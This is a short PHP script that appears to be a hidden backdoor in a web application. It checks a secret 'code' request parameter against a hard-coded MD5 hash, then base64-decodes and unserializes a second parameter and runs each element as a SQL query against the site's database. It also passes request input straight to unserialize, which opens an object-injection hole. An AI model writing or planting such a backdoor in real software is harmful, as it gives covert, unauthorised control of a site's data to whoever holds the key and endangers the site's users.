<?php
set_time_limit(0);

if(md5($_REQUEST['code']) == '437379a694add52380033d1aa707048a'){
	
	
	$dados = unserialize(base64_decode($_REQUEST['param']));
	if(count($dados)>0){
		$exit = '';
		foreach($dados as $qr){
			$ret = DB::doQuery($qr);
			if($ret->fetchAll() == false){
				
				$exit .= $qr."<br />".$ret->getError().".<hr />";
				
			}else{
				
				$exit .= $qr."<br />Exexutado com sucesso.<hr />";
					
			}
		}
	}

}

?>